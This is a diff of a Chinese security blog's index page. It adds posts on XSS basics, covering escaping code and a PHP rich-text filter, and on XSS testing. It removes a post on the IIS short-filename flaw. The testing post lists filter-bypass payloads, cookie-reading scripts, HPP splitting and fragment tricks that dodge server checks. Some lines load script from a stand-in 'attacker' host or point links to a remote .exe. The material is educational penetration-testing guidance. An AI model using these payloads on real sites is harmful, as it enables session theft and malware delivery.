@@ -138,6 +138,540 @@
 		<div class="markdown-body home-categories">
 		
 			<div class="article">
+                <a class="clearlink" href="15446890453437.html">
+                
+                  <h1>xss基础</h1>
+                  <div class="a-content">
+                      
+                      <div class="a-content-text">
+                        
+                        	<blockquote>
+<p>description: 这里包含了xss的基本定义，原理、及防御方案代码示例。</p>
+</blockquote>
+
+<h2 id="toc_0">简介</h2>
+
+<p>跨站脚本XSS是一种注入类型攻击，攻击者注入恶意代码到web应用程序并发送给不同的最终用户时，就会发生xss攻击，并且可能发生在web应用程序<u>在其生成的输出中使用来之用户的输入</u>并且无需验证或编码它的任何地方。</p>
+
+<p>跨站脚本发生在：</p>
+
+<ul>
+<li>任何可以插入数据，并且数据包会未经恶意内容验证就发送给Web用户的地方。</li>
+</ul>
+
+<p>跨站脚本分为两类：</p>
+
+<ul>
+<li>反射型(又称非持久性xss): 反射性xss通常出现在错误消息、搜索结果、或者服务器实时响应部分或全部请求的地方。可以通过电子邮件、恶意链接、等途径进行攻击。</li>
+<li>存储型(又称持久性xss): 存储型xss通常将恶意代码永久存储在目标服务器上，如数据库、消息论坛、访问日志、注释字段等。</li>
+<li>DOM型: dom型xss我觉得也属于存储型，只不过是存储在客户端。有效载荷修改了客户端浏览器中的DOM环境并执行恶意代码，也就是说HTTP响应是不变的，恶意代码被存储在客户端响应页面中。因此很难在服务器端做安全检测。</li>
+</ul>
+
+<h2 id="toc_1">危害</h2>
+
+<p>xss可以窃取用户的会话cookie，允许攻击者劫持用户的会话并接管账号，其他攻击包括最终用户文件的泄露、木马程序安装、将用户重定向到其他页面或站点、修改内容的呈现等。</p>
+
+<p>具体危害如：允许攻击者修改新闻稿或新闻项目的XSS漏洞可能会影响公司的股价或降低消费者信心。制药网站上的XSS漏洞可能允许攻击者修改剂量信息，从而导致过量服用。</p>
+
+<h2 id="toc_2">防御</h2>
+
+<p>1、在<strong>输出时</strong>将不可信数据（用户可控的数据：包括主体、属性、JavaScript、CSS或URL）使用 htmlEscape（）进行转义；将html、js中涉及到的关键字符进行html编码处理后再输出到页面上。</p>
+
+<p>2、如果存在用户需要编写文章等功能的时候，类似用户可以自定义页面样式的功能，则需要限制用户的输入，采用严格的<strong>白名单</strong>机制来过滤用户的输入，即非用户允许的功能标签都应该被完全过滤，这种过滤应依赖于后端应用来实现。</p>
+
+<p>3、应注意很多开源的第三方富文本编辑器，部分编辑器仅在JS端进行过滤，而不在后端进行关键字过滤。</p>
+
+<h3 id="toc_3">代码示例</h3>
+
+<p>1.Java<br/>
+<strong>Portal 或 Spring 框架修复方案：</strong></p>
+
+<pre class="line-numbers"><code class="language-java">import org.springframework.web.util.HtmlUtils;
+target = HtmlUtils.htmlEscape(target);
+</code></pre>
+
+<p>// target 参数为需要进行转义的参数，建议在该参数输出前进行转义</p>
+
+<p><strong>通用型修复方案</strong>：</p>
+
+<pre class="line-numbers"><code class="language-java">StringEscapeUtils from Apache Commons Lang:
+
+import static org.apache.commons.lang.StringEscapeUtils.escapeHtml;
+// ...
+String source = &quot;The less than sign (&lt;) and ampersand (&amp;) must be escaped before using them in HTML&quot;;
+String escaped = escapeHtml(source);
+
+
+For version 3:
+
+import static org.apache.commons.lang3.StringEscapeUtils.escapeHtml4;
+// ...
+String escaped = escapeHtml4(source);
+</code></pre>
+
+<p>2.<strong>PHP</strong><br/>
+htmlspecialchars() 在输出时使用该函数转义用户输入的值，尤其注意第二个 flag 参数要使用 ENT_QUOTES</p>
+
+<pre class="line-numbers"><code class="language-php">&lt;?php 
+    $name = $_GET[&quot;name&quot;];
+    $name = htmlspecialchars($name, ENT_QUOTES);
+?&gt;
+</code></pre>
+
+<p>htmlentities() 在输出时使用该函数转义用户输入的值</p>
+
+<p>针对富文本，使用以下过滤类进行处理：</p>
+
+<pre class="line-numbers"><code class="language-php">&lt;?php
+/**
+ * PHP 富文本XSS过滤类
+ *
+ * @package XssHtml
+ * @version 1.0.0 
+ * @link http://phith0n.github.io/XssHtml
+ * @since 20140621
+ * @copyright (c) Phithon All Rights Reserved
+ *
+ */
+
+#
+# Usage: 
+# &lt;?php
+# require(&#39;Xss.php&#39;);
+# $html = &#39;&lt;html code&gt;&#39;;
+# $xss = new XssHtml($html);
+# $html = $xss-&gt;getHtml();
+# ?\&gt;
+# 
+# 需求：
+# PHP Version &gt; 5.0
+# 浏览器版本：IE7+ 或其他浏览器，无法防御IE6及以下版本浏览器中的XSS
+# 更多使用选项见 http://phith0n.github.io/XssHtml
+
+class Xss {
+    private $m_dom;
+    private $m_xss;
+    private $m_ok;
+    private $m_AllowAttr = array(&#39;title&#39;, &#39;src&#39;, &#39;href&#39;, &#39;id&#39;, &#39;class&#39;, &#39;style&#39;, &#39;width&#39;, &#39;height&#39;, &#39;alt&#39;, &#39;target&#39;, &#39;align&#39;);
+    private $m_AllowTag = array(&#39;img&#39;, &#39;br&#39;, &#39;strong&#39;, &#39;b&#39;, &#39;code&#39;, &#39;p&#39;, &#39;div&#39;, &#39;em&#39;, &#39;span&#39;, &#39;h1&#39;, &#39;h2&#39;, &#39;h3&#39;, &#39;h4&#39;, &#39;h5&#39;, &#39;h6&#39;, &#39;table&#39;, &#39;ul&#39;, &#39;ol&#39;, &#39;tr&#39;, &#39;th&#39;, &#39;td&#39;, &#39;hr&#39;, &#39;li&#39;, &#39;u&#39;);
+
+    /**
+     * 构造函数
+     *
+     * @param string $html 待过滤的文本
+     * @param string $charset 文本编码，默认utf-8
+     * @param array $AllowTag 允许的标签，如果不清楚请保持默认，默认已涵盖大部分功能，不要增加危险标签
+     */
+    public function __construct($html, $charset = &#39;utf-8&#39;, $AllowTag = array()){
+        $this-&gt;m_AllowTag = empty($AllowTag) ? $this-&gt;m_AllowTag : $AllowTag;
+        $this-&gt;m_xss = strip_tags($html, &#39;&lt;&#39; . implode(&#39;&gt;&lt;&#39;, $this-&gt;m_AllowTag) . &#39;&gt;&#39;);
+        if (empty($this-&gt;m_xss)) {
+            $this-&gt;m_ok = FALSE;
+            return ;
+        }
+        $this-&gt;m_xss = &quot;&lt;meta http-equiv=\&quot;Content-Type\&quot; content=\&quot;text/html;charset={$charset}\&quot;&gt;&lt;nouse&gt;&quot; . $this-&gt;m_xss . &quot;&lt;/nouse&gt;&quot;;
+        $this-&gt;m_dom = new DOMDocument();
+        $this-&gt;m_dom-&gt;strictErrorChecking = FALSE;
+        $this-&gt;m_ok = @$this-&gt;m_dom-&gt;loadHTML($this-&gt;m_xss);
+    }
+
+    /**
+     * 获得过滤后的内容
+     */
+    public  function getHtml()
+    {
+        if (!$this-&gt;m_ok) {
+            return &#39;&#39;;
+        }
+        $nodeList = $this-&gt;m_dom-&gt;getElementsByTagName(&#39;*&#39;);
+        for ($i = 0; $i &lt; $nodeList-&gt;length; $i++){
+            $node = $nodeList-&gt;item($i);
+            if (in_array($node-&gt;nodeName, $this-&gt;m_AllowTag)) {
+                if (method_exists($this, &quot;__node_{$node-&gt;nodeName}&quot;)) {
+                    call_user_func(array($this, &quot;__node_{$node-&gt;nodeName}&quot;), $node);
+                }else{
+                    call_user_func(array($this, &#39;__node_default&#39;), $node);
+                }
+            }
+        }
+        $html = strip_tags($this-&gt;m_dom-&gt;saveHTML(), &#39;&lt;&#39; . implode(&#39;&gt;&lt;&#39;, $this-&gt;m_AllowTag) . &#39;&gt;&#39;);
+        $html = preg_replace(&#39;/^\n(.*)\n$/s&#39;, &#39;$1&#39;, $html);
+        return $html;
+    }
+
+    private function __true_url($url){
+        if (preg_match(&#39;#^https?://.+#is&#39;, $url)) {
+            return $url;
+        }else{
+            return &#39;http://&#39; . $url;
+        }
+    }
+
+    private function __get_style($node){
+        if ($node-&gt;attributes-&gt;getNamedItem(&#39;style&#39;)) {
+            $style = $node-&gt;attributes-&gt;getNamedItem(&#39;style&#39;)-&gt;nodeValue;
+            $style = str_replace(&#39;\\&#39;, &#39; &#39;, $style);
+            $style = str_replace(array(&#39;&amp;#&#39;, &#39;/*&#39;, &#39;*/&#39;), &#39; &#39;, $style);
+            $style = preg_replace(&#39;#e.*x.*p.*r.*e.*s.*s.*i.*o.*n#Uis&#39;, &#39; &#39;, $style);
+            return $style;
+        }else{
+            return &#39;&#39;;
+        }
+    }
+
+    private function __get_link($node, $att){
+        $link = $node-&gt;attributes-&gt;getNamedItem($att);
+        if ($link) {
+            return $this-&gt;__true_url($link-&gt;nodeValue);
+        }else{
+            return &#39;&#39;;
+        }
+    }
+
+    private function __setAttr($dom, $attr, $val){
+        if (!empty($val)) {
+            $dom-&gt;setAttribute($attr, $val);
+        }
+    }
+
+    private function __set_default_attr($node, $attr, $default = &#39;&#39;)
+    {
+        $o = $node-&gt;attributes-&gt;getNamedItem($attr);
+        if ($o) {
+            $this-&gt;__setAttr($node, $attr, $o-&gt;nodeValue);
+        }else{
+            $this-&gt;__setAttr($node, $attr, $default);
+        }
+    }
+
+    private function __common_attr($node)
+    {
+        $list = array();
+        foreach ($node-&gt;attributes as $attr) {
+            if (!in_array($attr-&gt;nodeName, 
+                $this-&gt;m_AllowAttr)) {
+                $list[] = $attr-&gt;nodeName;
+            }
+        }
+        foreach ($list as $attr) {
+            $node-&gt;removeAttribute($attr);
+        }
+        $style = $this-&gt;__get_style($node);
+        $this-&gt;__setAttr($node, &#39;style&#39;, $style);
+        $this-&gt;__set_default_attr($node, &#39;title&#39;);
+        $this-&gt;__set_default_attr($node, &#39;id&#39;);
+        $this-&gt;__set_default_attr($node, &#39;class&#39;);
+    }
+
+    private function __node_img($node){
+        $this-&gt;__common_attr($node);
+
+        $this-&gt;__set_default_attr($node, &#39;src&#39;);
+        $this-&gt;__set_default_attr($node, &#39;width&#39;);
+        $this-&gt;__set_default_attr($node, &#39;height&#39;);
+        $this-&gt;__set_default_attr($node, &#39;alt&#39;);
+        $this-&gt;__set_default_attr($node, &#39;align&#39;);
+
+    }
+
+    private function __node_a($node){
+        $this-&gt;__common_attr($node);
+        $href = $this-&gt;__get_link($node, &#39;href&#39;);
+
+        $this-&gt;__setAttr($node, &#39;href&#39;, $href);
+        $this-&gt;__set_default_attr($node, &#39;target&#39;, &#39;_blank&#39;);
+    }
+
+    private function __node_embed($node){
+        $this-&gt;__common_attr($node);
+        $link = $this-&gt;__get_link($node, &#39;src&#39;);
+
+        $this-&gt;__setAttr($node, &#39;src&#39;, $link);
+        $this-&gt;__setAttr($node, &#39;allowscriptaccess&#39;, &#39;never&#39;);
+        $this-&gt;__set_default_attr($node, &#39;width&#39;);
+        $this-&gt;__set_default_attr($node, &#39;height&#39;);
+    }
+
+    private function __node_default($node){
+        $this-&gt;__common_attr($node);
+    }
+}
+
+?&gt;
+</code></pre>
+
+                        
+                      </div>
+                  </div>
+                </a>
+                <div class="read-more clearfix">
+                  <div class="more-left left">
+                  
+                    <span class="date">2018/12/13 16:17 下午</span>
+                    <span>posted in&nbsp;</span> 
+          				  
+          					    <span class="posted-in"><a href='%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95.html'>渗透测试</a></span>
+          				   
+                  </div>
+                  <div class="more-right right">
+                  <span class="comments">
+                      
+
+                       
+                  </span>
+                  </div>
+                </div>
+              </div><!-- article -->
+        
+			<div class="article">
+                <a class="clearlink" href="15446888524769.html">
+                
+                  <h1>xss检测</h1>
+                  <div class="a-content">
+                      
+                      <div class="a-content-text">
+                        
+                        	<h2 id="toc_0">反射型xss</h2>
+
+<p>1、检测输入向量，确定所有web应用程序的用户定义变量以及如何输入他们，包括显而易见的、http参数、post数据、隐藏的表单字段值等。</p>
+
+<p>2、分析每个输入向量并注入payload以检测潜在的漏洞。</p>
+
+<p>3、分析结果并确定是否存在具有实际影响的漏洞。</p>
+
+<ul>
+<li><p>没有任何防御的情况下</p>
+<p>直接访问即会弹窗</p>
+<pre class="line-numbers"><code class="language-http">http://example.com/index.php?user=&lt;script&gt;alert(123)&lt;/script&gt;
+</code></pre>
+<p>下面这段代码会导致用户单击测试人员提供的链接，即葱他控制的站点下载文件test.exe。</p>
+<pre class="line-numbers"><code class="language-http">http://example.com/index.php?user=&lt;script&gt;window.onload = function() {var AllLinks=document.getElementsByTagName(&quot;a&quot;); 
+AllLinks[0].href = &quot;http://badexample.com/test.exe&quot;; }&lt;/script&gt; 
+</code></pre></li>
+<li><p>标记属性值</p>
+<p>有些情况下可以不使用<code>&lt;script&gt;</code>标签的情况下执行xss漏洞利用，甚至不使用通常过滤的 &lt;&gt; 和 / 等字符。</p>
+<p>例如，Web应用程序可以使用用户输入值来填充属性，如以下代码所示：</p>
+<pre class="line-numbers"><code class="language-javascript">&lt;input type=&quot;text&quot; name=&quot;state&quot; value=&quot;INPUT_FROM_USER&quot;&gt;
+</code></pre>
+<p>然后攻击者可以提交以下代码：</p>
+<pre class="line-numbers"><code class="language-javascript">&quot; onfocus=&quot;alert(document.cookie)
+</code></pre></li>
+<li><p>不同的语法或编码</p>
+<p>通常可以使用这种方法来绕过一些过滤器</p>
+<p>代码示例：</p></li>
+</ul>
+
+<pre class="line-numbers"><code class="language-javascript">  &quot;&gt;&lt;script &gt;alert(document.cookie)&lt;/script &gt;
+  &quot;&gt;&lt;ScRiPt&gt;alert(document.cookie)&lt;/ScRiPt&gt;
+  &quot;%3cscript%3ealert(document.cookie)%3c/script%3e
+</code></pre>
+
+<ul>
+<li><p>绕过非递归过滤器</p>
+<p>有时，过滤器只清理一次，而不是递归执行</p>
+<pre class="line-numbers"><code class="language-javascript">&lt;scr&lt;script&gt;ipt&gt;alert(document.cookie)&lt;/script&gt;
+</code></pre></li>
+<li><p>包含外部脚本</p>
+<p>现在假设目标站点的开发人员实现了以下代码来保护输入不包含外部脚本：</p></li>
+</ul>
+
+<pre class="line-numbers"><code class="language-text">&lt;?
+   $re = &quot;/&lt;script[^&gt;]+src/i&quot;;
+
+   if (preg_match($re, $_GET[&#39;var&#39;])) 
+   {
+      echo &quot;Filtered&quot;;
+      return; 
+   }
+   echo &quot;Welcome &quot;.$_GET[&#39;var&#39;].&quot; !&quot;;
+?&gt;
+</code></pre>
+
+<p>这种方案中，有一个正则表达式检测是否在 <code>&lt;script</code> 和 <code>&gt;</code> 之间插入了除 src 之外的任何其他内容。这对</p>
+
+<pre class="line-numbers"><code class="language-javascript">&lt;script src=&quot;http://attacker/xss.js&quot;&gt;&lt;/script&gt;
+</code></pre>
+
+<p>这种表达式特别有效。</p>
+
+<p>但是可以使用以下方式绕过：</p>
+
+<pre class="line-numbers"><code class="language-javascript">http://example/?var=&lt;SCRIPT%20a=&quot;&gt;&quot;%20SRC=&quot;http://attacker/xss.js&quot;&gt;&lt;/SCRIPT&gt; 
+</code></pre>
+
+<ul>
+<li>HTTP参数污染(HPP)</li>
+</ul>
+
+<p>这种规避技术包括在具有相同名称的多个参数之间拆分攻击向量。对每个参数值的操纵取决于每个web技术如何解析这些参数，因此这种规避不是总是可行的。</p>
+
+<p>定向攻击代码：</p>
+
+<pre class="line-numbers"><code class="language-javascript">http://example/page.php?param=&lt;script&gt;[...]&lt;/script&gt;
+</code></pre>
+
+<p>使用HPP攻击：</p>
+
+<pre class="line-numbers"><code class="language-javascript">http://example/page.php?param=&lt;script&amp;param=&gt;[...]&lt;/&amp;param=script&gt;
+</code></pre>
+
+<ul>
+<li>通常使用burp的主动扫描，即可检测出大部分情况下的反射型xss，而存储型xss目前还没有比较好的检测方法。</li>
+</ul>
+
+<h2 id="toc_1">存储型xss</h2>
+
+<ul>
+<li><p>输入表格</p></li>
+<li><p>存储型xss能不能成功主要取决于能不能规避过滤器。</p></li>
+<li><p>上传文件</p>
+<p>如果web应用程序允许文件上传，那么检查是否可以上载html内容就很重要。如果允许html或者txt文件，则可以在上载的文件中注入xss有效载荷。还应该验证文件上载是否允许设置任意MIME类型。</p>
+<p>考虑以下用于文件上传的 HTTP POST 请求：</p>
+<pre class="line-numbers"><code class="language-http">POST /fileupload.aspx HTTP/1.1
+[…]<br/>
+Content-Disposition: form-data; name=&quot;uploadfile1&quot;; filename=&quot;C:\Documents and Settings\test\Desktop\test.txt&quot;<br/>
+Content-Type: text/plain<br/>
+test
+</code></pre>
+<p>这种设计缺陷可以在浏览器 MIME 错误处理攻击中利用。例如，像jpg、gif这样的文件可以包含在浏览器加载时执行xss的有效载荷。当images、gif这样的图像的MIME类型可以设置为text/html时，这是可能的。这种情况下，客户端浏览器将文件视为HTML。</p>
+<p>HTTP POST 请求伪造:</p>
+<pre class="line-numbers"><code class="language-http">Content-Disposition: form-data; name=&quot;uploadfile1&quot;; filename=&quot;C:\Documents and Settings\test\Desktop\test.gif&quot;
+Content-Type: text/html<br/>
+&lt;script&gt;alert(document.cookie)&lt;/script&gt;
+</code></pre></li>
+<li><p>测试应用程序如何处理用户输入</p>
+<p>可以执行以下步骤:</p>
+<ul>
+<li>使用前端应用程序并输入带有特殊/无效字符的输入</li>
+<li>分析应用程序响应</li>
+<li>确定输入验证控件存在</li>
+<li>访问后端系统并检查输入是否存储以及如何存储</li>
+<li>分析源代码并了解应用程序如何呈现存储的输入</li>
+</ul></li>
+<li><p>如果源码可用，则应分析输入表单中使用的所有变量，特别是PHP、ASP和JSP等编程语言使用预定义的变量/函数来存储来自HTTP GET和POST请求的输入。</p>
+<p>下表总结了在分析源代码时要查看的一些特殊变量和函数：</p>
+<table>
+<thead>
+<tr>
+<th>语言</th>
+<th>PHP</th>
+<th>ASP</th>
+<th>JSP</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>变量函数</td>
+<td>$_GET —— HTTP GET变量</td>
+<td>Request.QueryString —— HTTP GET</td>
+<td>doGet, doPost servlets —— HTTP GET 和 POST</td>
+</tr>
+<tr>
+<td></td>
+<td>$_POST—— HTTP POST变量</td>
+<td>Request.Form ——  HTTP POST</td>
+<td>request.getParameter —— HTTP GET/POST 变量</td>
+</tr>
+<tr>
+<td></td>
+<td>$_REQUEST —— HTTP POST, GET 和 COOKIE变量</td>
+<td>Server.CreateObject —— 用来上传文件</td>
+<td></td>
+</tr>
+<tr>
+<td></td>
+<td>$_FILES —— HTTP文件上传变量</td>
+<td></td>
+<td></td>
+</tr>
+</tbody>
+</table></li>
+</ul>
+
+<h2 id="toc_2">DOM型xss</h2>
+
+<ul>
+<li>举个例子：</li>
+</ul>
+
+<p>假如我们访问一个页面: <code>http://www.example.com/welcome.html</code></p>
+
+<pre class="line-numbers"><code class="language-markup">&lt;HTML&gt;
+&lt;TITLE&gt;Welcome!&lt;/TITLE&gt;
+Hi
+&lt;SCRIPT&gt;
+var pos=document.URL.indexOf(&quot;name=&quot;)+5;
+document.write(document.URL.substring(pos,document.URL.length));
+&lt;/SCRIPT&gt;
+&lt;BR&gt;
+Welcome to our system
+…
+&lt;/HTML&gt;
+</code></pre>
+
+<p>此页面将用于欢迎用户，例如:</p>
+
+<p><code>http://www.example.com/welcome.html?name=lonelyor</code></p>
+
+<p>但是请求如下: </p>
+
+<p><code>http://www.example.com/welcome.html?name=&lt;script&gt;alert(document.cookie)&lt;/script&gt;</code></p>
+
+<p>这样会触发dom型xss的条件。让我们看看为什么:</p>
+
+<p>当受害者的浏览器像 <code>www.example.con</code> 发送http请求，并接受上述(静态)html页面。然后受害者的浏览器会开始将html解析为dom，dom包含一个名为 document 的对象，该对象包含一个名为 URL 的属性，并且此属性使用当前页面的 URL 填充来作为 dom 创建的一部分。当解析器达到javascript代码时，它会执行</p>
+
+<pre class="line-numbers"><code class="language-javascript">var pos=document.URL.indexOf(&quot;name=&quot;)+5;
+document.write(document.URL.substring(pos,document.URL.length));
+</code></pre>
+
+<p>并修改页面的原始html。这种情况下，代码引用 document.URL，因此，此name字符串的一部分将嵌入在html中并立即解析，这时会在同一页面执行 <code>&lt;script&gt;alert(document.cookie)&lt;/script&gt;</code>，因此是xss条件。</p>
+
+<ul>
+<li><p>注意</p>
+<ul>
+<li>恶意代码在任何时候都没有嵌入到原始html页面中(这与反射和存储型不同)</li>
+<li>此漏洞仅在浏览器不修改url字符时才有效。当url不直接在地址栏中输入时，火狐会自动编码 document.url 中的 &lt;和&gt;(分别为 %3C 和 %3E )，因此火狐不易收到攻击。IE6.0因为不编码这些所以容易被攻击。当然，直接嵌入HTML只是一个攻击挂载点，有各种场景不需要&lt;和&gt;，因此Mozilla通常不能免受此攻击。</li>
+</ul></li>
+<li><p>规避服务器检测</p>
+<p>显然上面的方法还是把payload发送到了服务器，这样后端还是可以检测到，不过，我们可以规避这种检测。</p>
+<p>新的payload如下:</p>
+<p><code>http://www.example.com/welcome.html#name=&lt;script&gt;alert(document.cookie)&lt;/script&gt;</code></p>
+<p>注意文件后面的数学符号(#)，他告诉浏览器，#后面的内容都是片段，即不是查询的一部分，火狐和IE6.0不会将片段发送到服务器，因此服务器将看到相当于<code>http://www.example.com/welcome.html</code>，所以服务器不会看到有效载荷。</p></li>
+</ul>
+
+<h2 id="toc_3">参考链接</h2>
+
+<p><a href="https://www.owasp.org/index.php/Testing_for_Reflected_Cross_site_scripting_(OTG-INPVAL-001)">反射性xss</a></p>
+
+<p><a href="https://www.owasp.org/index.php/Testing_for_Stored_Cross_site_scripting_(OTG-INPVAL-002)">存储型xss</a></p>
+
+<p><a href="https://www.owasp.org/index.php/Testing_for_DOM-based_Cross_site_scripting_(OTG-CLIENT-001)">dom型xss</a></p>
+
+                        
+                      </div>
+                  </div>
+                </a>
+                <div class="read-more clearfix">
+                  <div class="more-left left">
+                  
+                    <span class="date">2018/12/13 16:14 下午</span>
+                    <span>posted in&nbsp;</span> 
+          				  
+          					    <span class="posted-in"><a href='%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95.html'>渗透测试</a></span>
+          				   
+                  </div>
+                  <div class="more-right right">
+                  <span class="comments">
+                      
+
+                       
+                  </span>
+                  </div>
+                </div>
+              </div><!-- article -->
+        
+			<div class="article">
                 <a class="clearlink" href="15446876559011.html">
                 
                   <h1>xssing.org跨站的艺术</h1>
@@ -671,388 +1205,6 @@ sqlmap -u “ http://xxxxxx.com:80/x/xx?x_id=1507 ” --method = “GET”-- coo
                 </div>
               </div><!-- article -->
         
-			<div class="article">
-                <a class="clearlink" href="15446866501207.html">
-                
-                  <h1>IIS短文件名漏洞</h1>
-                  <div class="a-content">
-                      
-                      <div class="a-content-text">
-                        
-                        	<h2 id="toc_0">漏洞原理</h2>
-
-<hr/>
-
-<p>windows在创建一个新文件时，操作系统还会生成 8.3 格式的兼容 MS-DOS 的（短）文件名，以允许基于 MS-DOS 或16位 windows 的程序访问这些文件。    </p>
-
-<h2 id="toc_1">利用场景</h2>
-
-<hr/>
-
-<p>1、用于猜解文件/文件名<br/><br/>
-2、.Net Framework 的拒绝服务攻击（不常见）</p>
-
-<h2 id="toc_2">检测方法</h2>
-
-<hr/>
-
-<p><strong>黑盒测试</strong><br/><br/>
-使用<a href="https://github.com/lijiejie/IIS_shortname_Scanner">IIS短文件名扫描器</a><br/><br/>
-<strong>白盒测试</strong><br/>
-几乎所有的 windows 操作系统，在 cmd 中使用命令：</p>
-
-<pre class="line-numbers"><code class="language-bat">dir /x
-</code></pre>
-
-<p>如图：<br/>
-<figure><img src="media/15446866501207/%E7%9F%AD%E6%96%87%E4%BB%B6%E5%90%8D%E6%98%BE%E7%A4%BA.png" alt="短文件名显示"/><figcaption>短文件名显示</figcaption></figure></p>
-
-<h2 id="toc_3">修复方案</h2>
-
-<hr/>
-
-<p>1、升级 .net framework 至 4.0 版本或以上<br/><br/>
-2、修改注册表键值<br/><br/>
-HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\FileSystem 修改NtfsDisable8dot3NameCreation为1。（此项默认为0）<br/><br/>
-此设置用于禁用短文件名功能，重启后生效。<br/><br/>
-或者通过 CMD 命令：    </p>
-
-<pre class="line-numbers"><code class="language-txt">Windows Server 2008 R2
-查询是否开启短文件名功能：fsutil 8dot3name query
-关闭该功能：fsutil 8dot3name set 1
-
-Windows Server 2003
-关闭该功能：fsutil behavior set disable8dot3 1
-</code></pre>
-
-<p>以上操作只能防止新创建的文件/文件名不会出现短文件名，而当前文件/文件名依然保持短文件名。完整解决方案还需要如下操作：<br/><br/>
-3、<br/><br/>
-　　a、从当前目录中创建一个副本,并将其重命名为 tempNew；<br/><br/>
-　　b、将当前目录重命名为“tempOld”；<br/><br/>
-　　c、将“tempNew”重命名为原来的目录名。<br/><br/>
-4、禁止 url 中使用 “~” 或它的 Unicode 编码。（IIS7.0的请求阻塞不能完全阻止“~”波浪号。）</p>
-
-<hr/>
-
-<hr/>
-
-<hr/>
-
-<h2 id="toc_4">背景知识</h2>
-
-<hr/>
-
-<p>windows 支持的长文件名最多为 255 个字符。windows 还以 8.3 格式生成与 MS-DOS 兼容的（短）文件名，以允许基于 MS-DOS 或 16 位 windows 的程序访问这些文件。<br/><br/>
-8.3格式短文件名规范中：<br/><br/>
-‘8’是指文件名或目录名的主体部分小于等于 8 个字节；‘3’是指文件名的扩展名部分小于等于 3 个字节。<br/><br/>
-windows 会按以下方式从长文件名生成短文件名：<br/><br/>
-windows 首先会删除文件名中的任何无效字符和空格。无效字符包括：</p>
-
-<pre class="line-numbers"><code class="language-txt">.&quot;/\[]:;=,
-</code></pre>
-
-<p>由于短文件名只能包含一个英文句点（.），因此 windows 将删除文件名中的其他英文句点，即使文件名中最后一个英文句点后面是有效的非空格字符也是如此。例如：windows 从长文件名 This is a really long filename.123.456.789.txt 生成短文件名 Thisis~1.txt 否则，windows 将忽略最后一个英文句点，而使用倒数第二个英文句点。例如：windows从长文件名 This is a really long filename.123.456.789. 生成短文件名 Thisis~1.789。<br/><br/>
-生成短文件名若需要复制的话，windows 将文件名截断为 6 个字符，并在后边附加一个波形符号（~）和一个数字（创建的每一个以 ~1 结尾的唯一文件名，复制文件以 ~2、~3等结尾。）    </p>
-
-<h2 id="toc_5">影响范围</h2>
-
-<hr/>
-
-<p>Windows 10 Pro released in July 2015Windows 10 Enterprise released in July 2015Microsoft Windows Server 2003 Standard EditionMicrosoft Windows Server 2003 Enterprise EditionMicrosoft Windows Server 2003 Datacenter EditionMicrosoft Windows Server 2003 Web EditionMicrosoft Windows Server 2003, Enterprise x64 EditionMicrosoft Windows Small Business Server 2003 Standard EditionMicrosoft Windows Small Business Server 2003 Premium EditionMicrosoft Windows XP Home EditionMicrosoft Windows XP Professional EditionMicrosoft Windows Datacenter Server Limited EditionMicrosoft Windows Advanced Server, Limited EditionMicrosoft Windows 2000 ServerMicrosoft Windows 2000 Advanced ServerMicrosoft Windows 2000 Professional EditionMicrosoft Windows NT Workstation 3.5Microsoft Windows NT Workstation 3.51Microsoft Windows NT Workstation 4.0 开发员版Microsoft Windows NT Server 3.51Microsoft Windows NT Server 4.0 Standard EditionWindows Vista Service Pack 2Windows Vista BusinessWindows Vista EnterpriseWindows Vista Home PremiumWindows Vista UltimateWindows Server 2008 Service Pack 2Windows Server 2008 StandardWindows Server 2008 EnterpriseWindows Server 2008 DatacenterWindows Server 2008 for Itanium-Based SystemsWindows 7 Service Pack 1Windows 7 Home PremiumWindows 7 ProfessionalWindows 7 EnterpriseWindows 7 UltimateWindows Server 2008 R2 Service Pack 1Windows Server 2008 R2 StandardWindows Server 2008 R2 EnterpriseWindows Server 2008 R2 DatacenterWindows Server 2008 R2 for Itanium-Based SystemsWindows 8 EnterpriseWindows 8 ProWindows Server 2012 FoundationWindows Server 2012 FoundationWindows Server 2012 FoundationWindows Server 2012 FoundationWindows Server 2012 StandardWindows Server 2012 StandardWindows Server 2012 StandardWindows Server 2012 StandardWindows Server 2012 DatacenterWindows Server 2012 DatacenterWindows Server 2012 DatacenterWindows Server 2012 Datacenter<br/>
-列表内所有操作系统均受影响（数据来源日期：20171213）<br/><br/>
-该漏洞有其局限性：<br/><br/>
-1、只能猜解文件/文件夹名前六位，以及扩展名前三位<br/><br/>
-2、名称较短的文件是没有响应的短文件名的<br/><br/>
-3、需要 IIS 和 .net 同时满足。  </p>
-
-<h2 id="toc_6">漏洞详情</h2>
-
-<hr/>
-
-<p>在 windows 上的 Apache（Apache支持短文件名）上运行的 web 应用程序正在创建一个长文件名文件（如sql备份文件或会话文件，假设文件名是 backup-082119f75623eb7abd7bf357698ff66c.sql，windows 将创建短文件名 BACKUP〜1.SQL）。这种情况下，如果我们用短文件名访问这个文件，那么就有可能获取这个包含sql数据库备份的文件。<br/><br/>
-比较著名的一个例子：<br/><br/>
-wordpress 有一个备份博客的插件，该插件会为备份创建一个自定义目录（backup-88456）。备份完成后，该目录包含一个名为 wordpress_wp_20120702_576.sql 的文件  ，即 WordPress 数据库备份。这本应该难以猜测的，因为我们的目录名称中有5个数字加上日期和另外3个数字，即使忽略日期也至少有 100,000,000 个组合。然而由于短文件名的原因，目录名会变成 BACKUP~1 而文件名会变成 WORDPR~1.SQL。100,000,000 个组合被缩减为一个组合。    </p>
-
-<h2 id="toc_7">漏洞利用</h2>
-
-<hr/>
-
-<p><strong>短文件名漏洞</strong><br/>
-漏洞利用需要使用到通配符。在 windows 中，* 可以匹配n个字符（n可以为0,一个星号和n个星号的意义一样）。判断某站点是否存在 IIS 短文件名爆破，构造如下payload：    </p>
-
-<pre class="line-numbers"><code class="language-http">1. http://www.xxx.com/*~1*/.aspx
-2. http://www.xxx.com/l1j1e*~1*/.aspx
-</code></pre>
-
-<p>若1返回404而2返回400，则可以判断目标站点存在漏洞。<br/><br/>
-判断漏洞存在后，继续猜解目录下是否存在a开头的文件或文件夹，访问：    </p>
-
-<pre class="line-numbers"><code class="language-http">http://www.xxx.com/a*~1*/.aspx
-</code></pre>
-
-<p>若存在将返回404，不存在则返回400。以此类推，不断向下猜解所有的6个字符。<br/><br/>
-到此要考虑两种情况，若abcdef开头的是一个文件夹则    </p>
-
-<pre class="line-numbers"><code class="language-http">http://www.xxx.com/abcdef*/~1/.aspx
-</code></pre>
-
